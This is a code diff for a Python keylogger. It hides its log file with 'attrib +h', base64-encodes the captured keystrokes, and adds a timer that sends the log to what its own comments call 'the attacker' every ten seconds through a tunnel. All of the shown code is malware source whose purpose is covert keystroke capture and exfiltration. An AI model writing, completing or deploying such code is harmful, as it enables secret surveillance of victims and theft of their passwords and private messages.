@@ -9,11 +9,16 @@ filepath = "log.txt"
 
 # Turn file to hidden
 def hide():
-    file = open(filepath, "w", encoding='utf-8')
-    file.close()
-    p = os.popen('attrib +h ' + filepath)
-    t = p.read()
-    p.close()
+    if os.path.exists(filepath):
+        p = os.popen('attrib +h ' + filepath)
+        t = p.read()
+        p.close()
+    else:
+        file = open(filepath, "w+", encoding='utf-8')
+        file.close()
+        p = os.popen('attrib +h ' + filepath)
+        t = p.read()
+        p.close()
 
 
 # Open connection to the attacker
@@ -34,8 +39,7 @@ def onKeyDown(e):
 def writeToFile(s):
     file = open(filepath, "a", encoding='utf-8')
     msg = encodeTXT(s)
-    file.write(s)
-
+    file.write(msg)
 
 # Encode using base64 cipher
 def encodeTXT(s):
@@ -56,12 +60,10 @@ def start():
 
 
 def send(ot):
-    # something
+    # wait 10 sec and send the log
+    threading.Timer(interval=10, function=send, args=(ot,)).start()
     ot.send_file()
 
 
 # Start tunnel
 start()
-
-
-#opensocket()
